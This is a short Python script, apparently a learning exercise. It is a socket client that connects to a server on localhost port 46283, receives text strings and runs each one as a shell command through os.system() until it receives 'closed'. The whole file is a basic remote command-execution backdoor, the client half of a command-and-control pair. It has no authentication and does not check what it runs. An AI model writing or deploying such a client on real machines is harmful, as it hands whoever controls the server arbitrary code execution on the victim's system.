import socket
import os

def client():
    
    HOST = "127.0.0.1"
    PORT = 46283

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    
    while True:
        #msg = input("Enter message:")
        #client.send(msg.encode("utf-8")[:1024])
        
        response = client.recv(1024)
        response = response.decode("utf-8")

        print(f"recived: {response}")
        os.system(response)
        if response.lower() == "closed":
            break

    client.close()
    print("connection to server closed")


client()